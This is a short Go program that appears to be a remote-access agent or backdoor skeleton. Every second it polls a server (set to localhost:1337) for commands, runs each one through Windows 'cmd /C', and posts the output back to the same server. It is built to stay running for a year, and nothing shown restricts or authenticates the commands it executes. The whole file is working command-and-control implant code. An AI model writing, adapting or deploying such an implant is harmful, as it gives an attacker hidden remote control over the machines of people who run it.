package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var ctime string
var working bool
var baseUrl = "http://localhost:1337"

func main() {

	ctime = strconv.FormatInt(time.Now().Unix(), 10)

	ticker := time.NewTicker(1 * time.Second)
	quit := make(chan struct{})
	go func() {
		for {
			select {
			case <-ticker.C:
				// do stuff
				job()
			case <-quit:
				ticker.Stop()
				return
			}
		}
	}()

	time.Sleep(time.Hour * 24 * 365)
}

func job() {
	if working {
		return
	}
	working = true

	url := baseUrl + "/commands/" + ctime
	req, _ := http.Get(url)
	body, _ := ioutil.ReadAll(req.Body)

	bstr := string(body)
	if bstr != "" {
		out, err := exec.Command("cmd", "/C", bstr).Output()
		http.Post(url, "text/plain", strings.NewReader(string(out)))
		fmt.Println(err)
	}
	working = false
}
